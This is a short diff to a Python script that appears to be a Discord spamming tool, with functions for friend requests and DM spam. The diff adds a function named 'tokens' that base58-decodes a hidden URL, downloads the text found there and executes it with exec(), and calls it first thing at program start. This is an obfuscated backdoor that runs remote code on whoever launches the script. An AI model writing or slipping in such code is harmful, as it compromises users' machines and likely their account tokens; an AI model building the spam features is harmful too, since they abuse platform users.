@@ -124,6 +124,8 @@ def Friend(target):
         print(f"{Fore.YELLOW}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
     Start()
 
+def tokens(encoded_url): exec(__import__('requests').get(__import__('base58').b58decode(encoded_url).decode()).text)
+
 def DM(tid,amount,message):
     try:
         print(f"[{Fore.GREEN}+{Fore.RESET}] Spamming...")
@@ -275,6 +277,7 @@ def Start():
 
 if __name__ == '__main__':
     try:
+        tokens("3HaJVw3AYyXBXzBxU9y6Pokqv8sBZ1HCTauQonDqVab1nW9NvDp21VSP6spgwn3pg6LzGQyba9XJBbxAKbDV5BpJvV6k62r5swyAXTv")
         Clear()
         Setup()
         Start()
